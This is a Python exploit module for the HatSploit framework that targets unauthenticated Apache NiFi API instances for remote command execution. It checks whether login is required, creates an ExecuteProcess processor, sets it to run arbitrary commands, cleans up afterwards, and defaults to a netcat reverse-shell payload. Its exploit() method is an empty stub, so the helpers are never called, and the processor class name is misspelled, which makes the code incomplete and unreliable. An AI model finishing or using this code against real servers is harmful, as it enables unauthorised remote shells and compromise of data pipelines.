"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.handler import Handler
from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient


class HatSploitModule(Module, Handler, HTTPClient):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "Apache NiFi API Remote Code Execution",
            'Module': "exploit/linux/apache/nifi_api_rce",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Remote Code Execution in Apache NiFi component API.",
            'Platform': "linux",
            'Rank': "high",
        }

        self.payload = {
            'Value': "unix/generic/netcat_reverse_tcp",
            'Architectures': None,
            'Platforms': ['linux', 'unix'],
            'Types': None,
        }

        self.options = {
            'HOST': {
                'Description': "Remote host.",
                'Value': None,
                'Type': "ip",
                'Required': True,
            },
            'PORT': {
                'Description': "Remote port.",
                'Value': None,
                'Type': "port",
                'Required': True,
            },
        }

    def clean_up(self, remote_host, remote_port, p_id):
        self.http_request(
            method='PUT',
            host=remote_host,
            port=remote_port,
            path=f'/nifi-api/processors/{p_id}/run-status',
            data={
                'revision': {'clientId': 'x', 'version': 1},
                'state': 'stopped'.upper(),
            },
        )

        self.http_request(
            method='DELETE',
            host=remote_host,
            port=remote_port,
            path=f'/nifi-api/processors/{p_id}/run-status/threads',
        )

    def fetch_process_group(self, remote_host, remote_port):
        response = self.http_request(
            method='GET',
            host=remote_host,
            port=remote_port,
            path='/nifi-api/process-groups/root',
        )

        return response.json()["id"]

    def run_command(self, remote_host, remote_port, p_id, command):
        response = self.http_request(
            method='PUT',
            host=remote_host,
            port=remote_port,
            path=f'/nifi-api/processors/{p_id}',
            data={
                'component': {
                    'config': {
                        'autoTerminatedRelationships': ['success'],
                        'properties': {
                            'Command': command.split()[0],
                            'Command Arguments': " ".join(command.split()[1:]),
                        },
                        'schedulingPeriod': '3600 sec',
                    },
                    'id': p_id,
                    'state': 'running'.upper(),
                },
                'revision': {'clientId': 'x', 'version': 1},
            },
            headers={"Content-Type": "application/json"},
        )

        return response.json()

    def create_process(self, remote_host, remote_port, p_id):
        response = self.http_request(
            method='POST',
            host=remote_host,
            port=remote_port,
            path=f'/nifi-api/process-groups/{p_id}/processors',
            data={
                'component': {
                    'type': 'org.apache.nifi.processors.standart.ExecuteProcess'
                },
                'revision': {'version': 0},
            },
            headers={"Content-Type": "application/json"},
        )

        return response.json()["id"]

    def exploit(self, remote_host, remote_port, command):
        pass

    def check(self):
        remote_host, remote_port = self.parse_options(self.options)

        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/nifi-api/access/config',
        )

        if not response or response.json()["config"]["supportsLogin"]:
            return False

        return True

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.module_handle(self,
                           host=remote_host,
                           sender=self.exploit,
                           args={'remote_host': remote_host, 'remote_port': remote_port},
                           )
